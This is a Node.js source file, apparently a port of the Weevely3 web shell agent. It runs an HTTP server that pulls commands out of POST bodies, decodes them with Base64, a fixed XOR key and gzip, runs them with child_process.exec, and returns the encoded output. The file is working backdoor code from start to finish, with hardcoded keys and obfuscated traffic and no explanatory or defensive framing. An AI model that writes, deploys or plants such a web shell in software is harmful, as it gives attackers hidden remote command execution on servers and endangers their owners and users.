b'\n\nconst http = require(\'http\');\nconst zlib = require(\'zlib\');\nconst { exec } = require(\'child_process\');\n\n// Weevely3 Node.js Agent\n// Implements XOR -> GZIP -> Base64 protocol\n\nconst K = "5f4dcc3b";\nconst KH = "5aa765d61d83";\nconst KF = "27deb882cf99";\nconst P = "M3UH3XP5VG64dGtQ";\nconst PORT = process.env.PORT || 8080;\n\nfunction xor(text, key) {\n    const res = Buffer.alloc(text.length);\n    for (let i = 0; i < text.length; i++) {\n        res[i] = text[i] ^ key.charCodeAt(i % key.length);\n    }\n    return res;\n}\n\nconst server = http.createServer((req, res) => {\n    if (req.method === \'POST\') {\n        let body = [];\n        req.on(\'data\', (chunk) => {\n            body.push(chunk);\n        }).on(\'end\', () => {\n            body = Buffer.concat(body).toString();\n            \n            const start = body.indexOf(KH);\n            const end = body.indexOf(KF);\n            \n            if (start !== -1 && end !== -1) {\n                const payload = body.substring(start + KH.length, end);\n                \n                // Decode: Base64 -> XOR -> Gunzip\n                try {\n                    const decoded = Buffer.from(payload, \'base64\');\n                    const unxorred = xor(decoded, K);\n                    \n                    zlib.gunzip(unxorred, (err, buffer) => {\n                        if (!err) {\n                            const cmd = buffer.toString();\n                            \n                            exec(cmd, (error, stdout, stderr) => {\n                                const output = (stdout || \'\') + (stderr || \'\');\n                                \n                                // Encode: Gzip -> XOR -> Base64\n                                zlib.gzip(output, (err, compressed) => {\n                                    if (!err) {\n                                        const reXorred = xor(compressed, K);\n                                        const encoded = reXorred.toString(\'base64\');\n                                        \n                                        res.writeHead(200, { \'Content-Type\': \'text/plain\' });\n                                        res.end(P + KH + encoded + KF);\n                                    }\n                                });\n                            });\n                        }\n                    });\n                } catch (e) {\n                    res.end();\n                }\n            } else {\n                res.end();\n            }\n        });\n    } else {\n        res.writeHead(200);\n        res.end(\'Node Agent Running\');\n    }\n});\n\nserver.listen(PORT, () => {\n    console.log(`Agent running on port ${PORT}`);\n});\n'
